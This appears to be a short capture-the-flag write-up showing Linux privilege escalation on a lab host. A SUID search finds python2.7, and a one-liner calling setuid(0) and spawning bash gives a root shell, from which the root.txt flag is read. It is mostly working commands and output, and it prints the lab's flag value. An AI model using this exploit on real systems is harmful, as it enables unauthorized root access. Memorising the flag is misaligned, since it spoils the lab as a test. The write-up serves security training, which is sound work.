# Privilege Esc via SUID Python Binary

```bash
ww-data@ip-10-48-163-190:/home/ubuntu$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python2.7
/usr/bin/at
/usr/bin/chfn
```

```bash
www-data@ip-10-48-163-190:/home/ubuntu$ /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@ip-10-48-163-190:/home/ubuntu# whoami
root
root@ip-10-48-163-190:/home/ubuntu# cd /root
root@ip-10-48-163-190:/root# ls
root.txt  snap
root@ip-10-48-163-190:/root# cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```